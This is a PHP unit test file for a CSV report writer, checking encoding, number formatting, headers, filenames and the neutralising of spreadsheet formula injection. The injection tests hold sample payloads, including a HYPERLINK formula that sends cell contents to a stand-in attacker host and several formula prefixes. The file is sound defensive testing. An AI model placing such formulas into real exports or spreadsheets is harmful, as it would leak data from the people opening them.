<?php

declare(strict_types=1);

namespace Central\Api\Tests\Unit\Domain\Report;

use Central\Api\Domain\Report\CsvWriter;
use Central\Api\Domain\Report\ReportCatalogue;
use Central\Api\Domain\Report\ReportColumn;
use Central\Api\Domain\Report\ReportKey;
use Central\Api\Domain\Report\ReportResult;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

/**
 * A CSV a spreadsheet opens correctly, and one that does not run.
 */
#[CoversClass(CsvWriter::class)]
#[CoversClass(ReportColumn::class)]
final class CsvWriterTest extends TestCase
{
    private CsvWriter $csv;
    private ReportCatalogue $catalogue;

    protected function setUp(): void
    {
        $this->csv       = new CsvWriter();
        $this->catalogue = new ReportCatalogue();
    }

    #[Test]
    public function a_formula_in_a_cell_is_defused(): void
    {
        // Report rows carry names and course titles typed by people, some of
        // them by the learner being reported on. `=HYPERLINK(…)` in a course
        // title is a live exfiltration link in an administrator's spreadsheet.
        $csv = $this->write([
            ['learner' => '=HYPERLINK("http://evil.example"&A1)', 'score' => 88],
        ]);

        self::assertStringContainsString("\t=HYPERLINK", $csv);
        self::assertStringNotContainsString(',=HYPERLINK', $csv);
    }

    #[Test]
    public function every_formula_prefix_is_defused(): void
    {
        foreach (['=cmd', '+1+1', '-1+1', '@SUM(A1)'] as $payload) {
            $csv = $this->write([['learner' => $payload, 'score' => 1]]);

            self::assertStringContainsString("\t" . $payload, $csv, $payload);
        }
    }

    #[Test]
    public function an_ordinary_name_is_left_alone(): void
    {
        $csv = $this->write([['learner' => 'Ada Lovelace', 'score' => 91]]);

        self::assertStringContainsString('Ada Lovelace', $csv);
        self::assertStringNotContainsString("\tAda", $csv);
    }

    #[Test]
    public function the_file_starts_with_a_byte_order_mark(): void
    {
        // Excel on Windows reads a UTF-8 file without one as the local
        // codepage, and every accented name in the export comes out mangled.
        $csv = $this->write([['learner' => 'Zoë Böhm', 'score' => 70]]);

        self::assertStringStartsWith("\xEF\xBB\xBF", $csv);
        self::assertStringContainsString('Zoë Böhm', $csv);
    }

    #[Test]
    public function a_number_is_left_unquoted_so_a_spreadsheet_can_sum_it(): void
    {
        $csv = $this->write([['learner' => 'Ada', 'score' => 88.5]]);

        self::assertStringContainsString(',88.5', $csv);
        self::assertStringNotContainsString('"88.5"', $csv);
    }

    #[Test]
    public function the_header_row_uses_the_column_labels(): void
    {
        $csv = $this->write([['learner' => 'Ada', 'score' => 1]]);

        self::assertStringContainsString('Learner,Score', $csv);
    }

    #[Test]
    public function a_missing_value_becomes_an_empty_cell(): void
    {
        $csv = $this->write([['learner' => 'Ada']]);

        // The row still has both cells; the second is simply empty. A row
        // one column short would shift every later column in the sheet.
        self::assertStringContainsString("Ada,
", $csv);
    }

    #[Test]
    public function a_boolean_reads_as_yes_or_no(): void
    {
        $csv = $this->write([['learner' => true, 'score' => 1]]);

        self::assertStringContainsString('Yes', $csv);
    }

    #[Test]
    public function a_summary_exports_as_a_key_and_value_sheet(): void
    {
        // It has no columns, and its figures are still worth exporting.
        $result = ReportResult::summary(
            $this->catalogue->find(ReportKey::EnrollmentSummary),
            ['total' => 9, 'completionRate' => 44.4],
        );

        $csv = $this->csv->write($result);

        self::assertStringContainsString('Measure,Value', $csv);
        self::assertStringContainsString('Total', $csv);
        self::assertStringContainsString('Completion rate', $csv);
    }

    #[Test]
    public function the_filename_says_what_it_is_and_when(): void
    {
        // Two exports of the same report a month apart are different
        // documents; `report.csv` twice in a downloads folder is one of them.
        $name = $this->csv->filename(
            $this->catalogue->find(ReportKey::OverdueTraining),
            new \DateTimeImmutable('2026-03-01'),
        );

        self::assertSame('overdue-training-2026-03-01.csv', $name);
    }

    /**
     * @param list<array<string, mixed>> $rows
     */
    private function write(array $rows): string
    {
        return $this->csv->write(new ReportResult(
            $this->catalogue->find(ReportKey::EnrollmentDetail),
            [ReportColumn::text('learner', 'Learner'), ReportColumn::number('score', 'Score')],
            $rows,
        ));
    }
}
